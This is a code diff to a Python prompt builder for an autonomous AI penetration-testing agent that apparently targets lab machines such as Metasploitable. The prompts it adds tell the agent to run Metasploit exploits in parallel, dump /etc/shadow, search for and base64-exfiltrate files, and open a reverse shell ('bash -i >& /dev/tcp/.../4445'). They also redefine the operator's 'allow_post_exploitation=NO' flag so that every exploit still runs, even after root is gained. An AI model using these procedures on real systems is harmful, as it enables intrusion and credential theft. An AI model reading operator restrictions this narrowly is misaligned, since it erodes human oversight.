@@ -50,16 +50,52 @@ ATTACK PHASES (follow in order unless operator notes redirect you):
   2. PORT_SCAN       — nmap_scan (service/full) on each live host — use PORT RANGE from state
   3. EXPLOIT_SEARCH  — searchsploit_search for each discovered service/version
   4. EXPLOITATION    — metasploit_run (action=run) per vulnerability (only if POLICY allows)
-       *** CRITICAL: attempt EVERY HIGH/CRITICAL CVE found, even if you already have root.
+       *** CRITICAL: attempt EVERY CVE found, even if you already have root.
        *** Each exploit must be validated individually for the PoC report. Root access does
        *** NOT mean mission complete — continue until ALL unexecuted CVEs have been tried.
-  5. POST_EXPLOIT    — MANDATORY after each successful exploit:
+       *** allow_post_exploitation=NO does NOT stop phase 4. It only skips phase 5 recon.
+       *** Use parallel_tools to batch up to 10 metasploit_run calls simultaneously.
+  5. POST_EXPLOIT    — MANDATORY after each successful exploit (only if allow_post_exploitation=YES):
        a. INITIAL RECON — include post_commands in the exploit run call (preferred), or use action=session_exec if msfrpcd is available
        b. DEEP ENUM     — shell_exec (action=exec_script) for multi-step enumeration (SUID, cron, shadow, env secrets)
        c. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
        d. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
        e. FILE OPS      — shell_exec (action=upload/download) for transferring tools or exfiltrating data
-  6. DONE            — generate_report ONLY after ALL CVEs have been attempted
+  6. DONE            — generate_report rules (check BOTH conditions):
+       a. If MISSION OBJECTIVES are listed: generate_report once ALL objectives are marked [✓].
+          If an objective cannot be achieved (no shell access, service not exploitable), mark it
+          as "attempted — not achieved" in your thought and still call generate_report.
+       b. If NO objectives are listed: generate_report only after ALL UNEXECUTED CVEs are attempted
+          AND post-exploitation recon is collected from every compromised host.
+
+OBJECTIVE-DRIVEN BEHAVIOUR:
+- MISSION OBJECTIVES in your state are the operator's explicit success criteria.
+- Always keep objectives visible — every action should advance at least one objective.
+- After gaining shell access, immediately pursue file/data objectives:
+    "find flag.txt"         → run: find / -name flag.txt 2>/dev/null; cat <path>
+    "dump /etc/shadow"      → run: cat /etc/shadow
+    "achieve root"          → check id; if not root, attempt privilege escalation
+    "lateral movement"      → enumerate network interfaces, scan adjacent subnets
+- Use post_commands in metasploit_run OR shell_exec / ssh_exec to collect objective evidence.
+- When an objective is satisfied, a [OBJECTIVE ACHIEVED] message will appear in your memory.
+  Do NOT repeat the action — move on to the next objective or call generate_report.
+
+FILE CONTENT DISPLAY RULES (apply whenever a find/cat/shell command returns a file path or content):
+- Text files (.txt .log .conf .md .json .xml .csv .sh .py .rb .php .env) →
+    Read the file immediately with cat and include the FULL content in your thought/report.
+    Label it: [FILE CONTENT: /path/to/file] <content here>
+    NEVER call generate_report before reporting the actual content of objective-related files.
+- CRITICAL: When a find command locates a target file, you MUST cat it IN THE SAME post_commands list.
+    WRONG approach: post_commands=["find / -name 'flag.txt'"]  ← session closes before you can cat!
+    CORRECT approach: post_commands=["find / -name 'flag.txt' 2>/dev/null | grep -v proc | head -5 | while read f; do echo \"[FILE CONTENT: $f]\"; cat \"$f\"; done"]
+    This ensures the cat happens before msfconsole exits and the session is lost.
+- Binary/Office files (.png .jpg .pdf .zip .exe .pptx .docx .xlsx .tar .gz) →
+    Do NOT attempt to cat. Instead, state the path and provide transfer instructions:
+    "Found: /path/to/file — cannot display binary. To download: scp <user>@<IP>:/path/to/file /local/dir"
+- If post_commands already contain cat output in your memory (check [AEGIS_CMD_OUT] lines) →
+    Extract and report the content directly — no need to re-run cat.
+- If output was truncated and file content is missing →
+    Re-run the exploit with cat included in post_commands — do NOT use session_exec (session is already closed).
 
 MODE BEHAVIOUR:
 - scan_only          : Phases 1-3 only. Never call metasploit_run or ssh_exec for exploitation.
@@ -84,31 +120,83 @@ METASPLOIT PAYLOAD RULES:
 
 POST-EXPLOITATION WORKFLOW (MANDATORY after a successful exploit opens a session):
 
-PREFERRED: Include post_commands in the exploit run call (works with and without msfrpcd):
-  - Add "post_commands": ["id && whoami && uname -a && cat /etc/passwd", "cat /etc/shadow 2>/dev/null", "sudo -l 2>/dev/null"]
-  - The result will contain "post_command_output" with all command output.
-  - This is the ONLY reliable method when msfrpcd is unavailable (msfconsole fallback).
+RULE #1 — INCLUDE EVERYTHING IN post_commands (most reliable path):
+  The bind shell payload (cmd/unix/bind_netcat) ONLY stays open while msfconsole is running.
+  Once msfconsole exits, port 4444 on the target CLOSES immediately.
+  You CANNOT connect to it afterwards with shell_exec(action=connect).
+  Therefore: put ALL required commands into post_commands before the exploit runs.
 
-FALLBACK: If exploit already ran without post_commands, use action=session_exec (requires msfrpcd):
-  - action=session_exec WILL FAIL if msfrpcd is unavailable — do not retry repeatedly.
-  - If session_exec fails with "not valid or has been closed", the session was from a
-    msfconsole run (no persistent session). Re-run the exploit with post_commands instead.
+  Standard post_commands to always include:
+   - "id && whoami && pwd && uname -a"                   — identity + OS
+   - "cat /etc/passwd && cat /etc/shadow 2>/dev/null"    — accounts + hashes
+   - "netstat -tlnp 2>/dev/null || ss -tlnp"             — network state
+   - "ip addr 2>/dev/null || ifconfig"                   — interfaces
+   - "sudo -l 2>/dev/null"                               — sudo rights
+   - "find / -perm -4000 -type f 2>/dev/null | head -20" — SUID binaries
+   - "cat /etc/crontab 2>/dev/null"                      — cron jobs
 
-Initial recon commands to include in post_commands:
-   - "id && whoami && pwd && uname -a && cat /etc/passwd" — identity + OS + accounts
-   - "cat /etc/shadow 2>/dev/null" — password hashes (if readable)
-   - "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20" — privesc vectors
-   - "cat /etc/crontab 2>/dev/null; netstat -tlnp 2>/dev/null || ss -tlnp" — cron + network
+  OBJECTIVE-SPECIFIC commands to add when objectives are set:
+   - "find flag.txt"      → Use a FIND+CAT pipeline so content is read before the session closes:
+                            "find / -name 'flag.txt' -o -name 'flag' 2>/dev/null | grep -v proc | head -10 | while read f; do echo \"=== [FILE CONTENT: $f] ===\"; cat \"$f\"; done; cat /root/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat /var/flag.txt 2>/dev/null"
+                            ⚠ NEVER split find and cat across separate post_commands entries — do it in one command.
+   - "dump /etc/shadow"   → already covered above
+   - "achieve root"       → check id output; if not root, add: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+   - "exfiltrate <file>"  → "cat <file> | base64"
+
+RULE #2 — CHOOSE THE RIGHT SHELL METHOD (decision tree):
+
+  ┌─ SSH creds available in state?
+  │   YES → shell_exec(method=ssh)   ← most reliable, survives reboots
+  │   NO  ↓
+  ├─ Can I reach target's port directly?
+  │   YES → shell_exec(method=bind, target_port=<exploit's bind port>)
+  │         ⚠ Only works if msfconsole is STILL RUNNING (bind_netcat dies when msf exits)
+  │         ⚠ If exploit already finished → port is CLOSED → use post_commands instead
+  │   NO  ↓
+  └─ Target can reach me (egress allowed)?
+      YES → shell_exec(method=reverse, local_port=4445)
+            → get trigger_commands from result
+            → run a trigger_command on target (via session_exec or another shell)
+            → then call exec/exec_script — it auto-waits for callback
+
+RULE #3 — REVERSE SHELL WORKFLOW:
+  Step 1: shell_exec(action=connect, method=reverse, target_ip=X, local_port=4445)
+          → Returns IMMEDIATELY with {"session_key": "reverse:local:4445",
+                                       "trigger_commands": {"bash": "bash -i >& /dev/tcp/LHOST/4445 0>&1",
+                                                            "nc_pipe": "...", "python3": "..."}}
+  Step 2: Run one of the trigger_commands on the TARGET.
+          (via metasploit session_exec, or another existing shell)
+  Step 3: shell_exec(action=exec, session_key="reverse:local:4445", command="id")
+          → Automatically waits up to 120s for the target to call back, then executes.
+
+RULE #4 — session_exec fallback (only when msfrpcd is running):
+  - action=session_exec WILL FAIL if msfrpcd is unavailable.
+  - If it fails with "not valid or has been closed" → use post_commands on re-exploit.
+
+RULE #5 — NEVER invent session keys:
+  session_key MUST be the exact string returned by shell_exec(action=connect).
+  Format is always: "{method}:{host}:{port}" e.g. "ssh:10.0.0.1:22"
+  Do NOT use formats like "msf:IP:1" or "session:1" — those are INVALID.
+
+RULE #6 — AVOID RE-EXPLOITATION FOR FOLLOW-UP COMMANDS:
+  Once root is obtained, do NOT re-run the same exploit just to read a file or run another command.
+  Use these persistent access methods instead:
+  a. BINDSHELL port open (e.g. port 1524 "Metasploitable root shell"):
+     → shell_exec(action=connect, method=bind, target_ip=X, target_port=1524)
+     → then shell_exec(action=exec, session_key=..., command="cat /home/msfadmin/flag.txt")
+     This port is always open — no exploit needed!
+  b. SSH credentials found in /etc/passwd or post-exploit output:
+     → shell_exec(action=connect, method=ssh, target_ip=X, username=..., password=...)
+     → shell_exec(action=exec_script, session_key=..., commands=[...])
+  c. Distcc / other persistent backdoors on the target:
+     → Check if a known-open bind port exists before firing another exploit.
+  DECISION: Before re-running metasploit_run, always ask: "Is there a simpler way to get a shell?"
+  If a bind port or SSH is available → use shell_exec. Only re-exploit if no other path exists.
 
 CREDENTIALS & SSH:
-- If SSH CREDENTIALS are listed in your state, use ssh_exec after gaining initial access
-  or for authenticated system audits — do not ignore them.
-- Match credentials to hosts using the host_pattern field.
-
-SESSION INTERACTION:
-- Prefer post_commands in the run call over separate session_exec calls.
-- session_exec only works reliably when msfrpcd is running (RPC mode).
-- If session_exec fails with "not valid or has been closed", re-run the exploit with post_commands.
+- Only use shell_exec(method=ssh) if SSH CREDENTIALS are explicitly listed in your state.
+- If credentials are wrong, do NOT retry SSH — move on to metasploit_run with post_commands.
+- If no SSH credentials are available, use post_commands in the exploit call (Rule #1).
 
 MANDATORY OUTPUT FORMAT:
 Respond with a single valid JSON object only. No prose, no markdown, no comments.
@@ -308,28 +396,100 @@ Example 8 — Parallel exploit execution for multiple independent CVEs
   "reasoning": "3 independent RCE exploits on separate ports — parallel execution cuts 2 iterations."
 }
 
-Example 9 — shell_exec for deep post-exploitation enumeration
+Example 9A — metasploit_run with FULL post_commands (bind shell is ephemeral — get everything now):
 {
-  "thought": "SSH credentials available (msfadmin/msfadmin). Using shell_exec with exec_script for comprehensive post-exploitation enumeration — SUID binaries, cron, network, sensitive files — in a single SSH session.",
+  "thought": "Exploiting vsftpd 2.3.4 backdoor. Objective is 'find flag.txt'. The bind_netcat shell closes when msfconsole exits so I must collect ALL data — flag search, shadow, network — in this single call via post_commands.",
+  "action": "metasploit_run",
+  "parameters": {
+    "action": "run",
+    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+    "target_ip": "192.168.56.101",
+    "target_port": 21,
+    "payload": "",
+    "post_commands": [
+      "id && whoami && uname -a && hostname",
+      "cat /etc/passwd && cat /etc/shadow 2>/dev/null",
+      "netstat -tlnp 2>/dev/null || ss -tlnp",
+      "ip addr 2>/dev/null || ifconfig",
+      "find / -name 'flag*' -o -name '*flag*' 2>/dev/null | grep -v proc | head -30",
+      "cat /root/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat /var/www/flag.txt 2>/dev/null",
+      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20"
+    ]
+  },
+  "reasoning": "All post-exploit data + flag search in one call — bind shell closes after msfconsole exits."
+}
+
+Example 9B — shell_exec reverse shell (target connects back to us):
+Step 1 — start listener (returns immediately, non-blocking):
+{
+  "thought": "No SSH creds available. Exploit already completed so bind port 4444 is closed. Will plant a reverse shell: start listener, then send trigger via session_exec or another shell.",
+  "action": "shell_exec",
+  "parameters": {
+    "action": "connect",
+    "method": "reverse",
+    "target_ip": "192.168.56.101",
+    "local_port": 4445,
+    "reverse_wait": 60
+  },
+  "reasoning": "Start reverse listener — returns trigger_commands immediately."
+}
+Step 2 — trigger the callback (run trigger_command on target via session_exec):
+{
+  "thought": "Listener is up on port 4445. Sending reverse shell trigger to target via session_exec.",
+  "action": "metasploit_run",
+  "parameters": {
+    "action": "session_exec",
+    "session_id": 1,
+    "command": "bash -i >& /dev/tcp/192.168.56.1/4445 0>&1"
+  },
+  "reasoning": "Trigger reverse callback — target will connect to our listener."
+}
+Step 3 — exec commands (auto-waits for callback):
+{
+  "thought": "Trigger sent. Executing on the reverse session — tool waits for connection automatically.",
   "action": "shell_exec",
   "parameters": {
     "action": "exec_script",
-    "method": "ssh",
-    "target_ip": "192.168.1.5",
-    "target_port": 22,
-    "username": "msfadmin",
-    "password": "msfadmin",
+    "session_key": "reverse:local:4445",
     "commands": [
-      "id && whoami && uname -a && hostname",
-      "sudo -l 2>/dev/null",
-      "find / -perm -4000 -type f 2>/dev/null | head -20",
-      "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null",
-      "cat /etc/shadow 2>/dev/null | head -10",
-      "netstat -tlnp 2>/dev/null || ss -tlnp",
-      "env 2>/dev/null | grep -iE 'pass|key|secret|token|api' | head -10"
+      "id && whoami",
+      "find / -name 'flag*' 2>/dev/null | grep -v proc",
+      "cat /root/flag.txt 2>/dev/null",
+      "cat /etc/shadow 2>/dev/null"
     ]
   },
-  "reasoning": "Multi-step enumeration via SSH — single connection, all commands in sequence."
+  "reasoning": "Reuse the reverse session — waits for callback then executes all commands."
+}
+
+Example 9C — shell_exec SSH session (only when SSH credentials are listed in state):
+{
+  "thought": "SSH credentials listed in state. Connecting persistent SSH session for multi-command enumeration.",
+  "action": "shell_exec",
+  "parameters": {
+    "action": "connect",
+    "method": "ssh",
+    "target_ip": "192.168.56.101",
+    "target_port": 22,
+    "username": "msfadmin",
+    "password": "msfadmin"
+  },
+  "reasoning": "SSH — most reliable persistent shell; credentials available in state."
+}
+Then:
+{
+  "thought": "SSH session open. Running full post-exploitation.",
+  "action": "shell_exec",
+  "parameters": {
+    "action": "exec_script",
+    "session_key": "ssh:192.168.56.101:22",
+    "commands": [
+      "find / -name 'flag*' 2>/dev/null | grep -v proc",
+      "cat /root/flag.txt 2>/dev/null",
+      "cat /etc/shadow 2>/dev/null",
+      "netstat -tlnp 2>/dev/null || ss -tlnp"
+    ]
+  },
+  "reasoning": "Reuse open SSH session — no reconnect needed."
 }\
 """
 
@@ -369,8 +529,17 @@ class PromptBuilder:
         user_text = self._build_action_user_text(context)
 
         messages: list[dict] = [{"role": "system", "content": system_text}]
-        messages.extend(memory.build_context())
-        messages.append({"role": "user", "content": user_text})
+        context_messages = memory.build_context()
+
+        # If the last memory message is already "user", merge the current state into it
+        # to avoid consecutive user messages which most LLM APIs reject with 400.
+        if context_messages and context_messages[-1]["role"] == "user":
+            context_messages[-1]["content"] += "\n\n" + user_text
+            messages.extend(context_messages)
+        else:
+            messages.extend(context_messages)
+            messages.append({"role": "user", "content": user_text})
+
         return messages
 
     def build_reflection_messages(
@@ -397,13 +566,28 @@ class PromptBuilder:
             f"Vulnerabilities: {context.total_vulns} | "
             f"Exploit attempts: {context.total_exploits}"
         )
+        # Pull the last 6 messages directly (last thought + action + tool result cycle x2).
+        # This avoids the token-budget lottery that caused "No tool result was provided"
+        # hallucinations when pinned messages consumed most of the 1024-token window.
+        recent_msgs = list(memory._messages)[-6:]
+
         user_text = (
             f"Current state: {state_summary}\n\n"
             "Reflect on the last action result. Update your tactical assessment in 1-2 sentences."
         )
+        _role_map = {"tool_result": "user"}
         messages: list[dict] = [{"role": "system", "content": system_text}]
-        messages.extend(memory.build_context(max_tokens=1024))
-        messages.append({"role": "user", "content": user_text})
+        normalized = [
+            {"role": _role_map.get(m.role, m.role), "content": m.content}
+            for m in recent_msgs
+            if m.content
+        ]
+        if normalized and normalized[-1]["role"] == "user":
+            normalized[-1]["content"] += "\n\n" + user_text
+            messages.extend(normalized)
+        else:
+            messages.extend(normalized)
+            messages.append({"role": "user", "content": user_text})
         return messages
 
     # ── Private builders ──────────────────────────────────────────────────────
@@ -474,6 +658,27 @@ class PromptBuilder:
 
         lines.append("")
 
+        # ── Mission objectives ─────────────────────────────────────────────────
+        if m and m.objectives:
+            completed_set = set(context.completed_objectives)
+            done_count = len(completed_set)
+            total_count = len(m.objectives)
+            lines.append(f"MISSION OBJECTIVES ({done_count}/{total_count} complete):")
+            for obj in m.objectives:
+                status = "[✓]" if obj in completed_set else "[ ]"
+                lines.append(f"  {status} {obj}")
+            if done_count < total_count:
+                lines.append("  *** Pursue ALL unchecked objectives before calling generate_report. ***")
+                lines.append("  *** Use post_commands / shell_exec / ssh_exec to gather evidence.  ***")
+            else:
+                lines.append("  *** ALL objectives achieved — call generate_report now.            ***")
+            lines.append("")
+        else:
+            lines.append("MISSION OBJECTIVES: none specified")
+            lines.append("  -> Maximum enumeration mode: exploit ALL CVEs, collect full post-exploitation")
+            lines.append("     recon on every compromised host, then call generate_report.")
+            lines.append("")
+
         # ── Operator notes / scope notes ──────────────────────────────────────
         if context.notes:
             lines.append(f"OPERATOR NOTES:\n{context.notes}")
@@ -497,7 +702,7 @@ class PromptBuilder:
         if m:
             policy_lines = ["POLICY FLAGS (hard limits — do not violate):"]
             policy_lines.append(f"  allow_exploitation      : {'YES' if m.allow_exploitation else 'NO  <- do not call metasploit_run'}")
-            policy_lines.append(f"  allow_post_exploitation : {'YES  <- ssh_exec audit is permitted' if m.allow_post_exploitation else 'NO  <- do not run post-exploit actions'}")
+            policy_lines.append(f"  allow_post_exploitation : {'YES  <- ssh_exec audit is permitted' if m.allow_post_exploitation else 'NO  <- skip step-5 commands (shell_exec/ssh_exec audit) — but STILL attempt every UNEXECUTED CVE via metasploit_run before generate_report'}")
             policy_lines.append(f"  allow_lateral_movement  : {'YES  <- pivot to new subnets if discovered' if m.allow_lateral_movement else 'NO  <- stay on initial target subnet only'}")
             policy_lines.append(f"  allow_docker_escape     : {'YES' if m.allow_docker_escape else 'NO'}")
             policy_lines.append(f"  allow_browser_recon     : {'YES' if m.allow_browser_recon else 'NO'}")
@@ -547,9 +752,13 @@ class PromptBuilder:
             lines.append("LIVE HOSTS: none discovered yet")
 
         if context.scan_results:
-            lines.append(f"\nOPEN SERVICES (last 5):")
-            for s in context.scan_results[-5:]:
+            total = len(context.scan_results)
+            display = context.scan_results if total <= 30 else context.scan_results[:30]
+            lines.append(f"\nOPEN SERVICES ({total} total{', showing first 30' if total > 30 else ''}):")
+            for s in display:
                 lines.append(f"  {s}")
+            if total > 30:
+                lines.append(f"  ... and {total - 30} more (all stored — do NOT re-scan)")
 
         if context.vulnerabilities:
             lines.append(f"\nVULNERABILITIES ({len(context.vulnerabilities)}) (last 5):")
@@ -576,11 +785,14 @@ class PromptBuilder:
                 if not any(a in v for a in attempted_modules)
             ]
             if unattempted:
-                lines.append(f"\nUNEXECUTED CVEs ({len(unattempted)}) — MUST attempt before generate_report:")
+                lines.append(f"\nUNEXECUTED CVEs ({len(unattempted)}) — MUST attempt ALL before generate_report:")
+                lines.append("  *** allow_post_exploitation=NO only blocks step-5 recon commands.    ***")
+                lines.append("  *** It does NOT block metasploit_run. Attempt every CVE below first. ***")
+                lines.append("  *** Use parallel_tools to run up to 10 exploits simultaneously.      ***")
                 for v in unattempted[:10]:
                     lines.append(f"  ! {v}")
                 if len(unattempted) > 10:
-                    lines.append(f"  ... and {len(unattempted) - 10} more")
+                    lines.append(f"  ... and {len(unattempted) - 10} more — use parallel_tools batches of 10")
             else:
                 lines.append("\nALL CVEs ATTEMPTED — may now call generate_report.")
 
@@ -593,6 +805,13 @@ class PromptBuilder:
         if context.hosts_pending_port_scan:
             lines.append(
                 f"\nPENDING PORT SCANS: {', '.join(context.hosts_pending_port_scan[:5])}"
+            )
+        elif context.scan_results:
+            # Queue is empty and we have results → scanning is done for all hosts
+            scanned = sorted({s.split(":")[0] for s in context.scan_results if ":" in s})
+            lines.append(
+                f"\nPORT SCAN COMPLETE — {len(scanned)} host(s) fully scanned: "
+                f"{', '.join(scanned)}. Do NOT run nmap_scan again on these hosts."
             )
 
         # Show services still needing exploit search — agent MUST search all before exploitation
@@ -631,10 +850,11 @@ class PromptBuilder:
         """
         Drop examples once we're deep into the exploitation phase to save tokens.
         Early phases benefit more from the examples than later ones.
+        Keep examples during EXPLOITATION so the parallel exploit pattern stays visible.
         """
-        if context.attack_phase in ("EXPLOITATION", "DONE"):
+        if context.attack_phase == "DONE":
             return False
-        return not context.iteration > 20
+        return not context.iteration > 30
 
     # ── Utility ───────────────────────────────────────────────────────────────
 
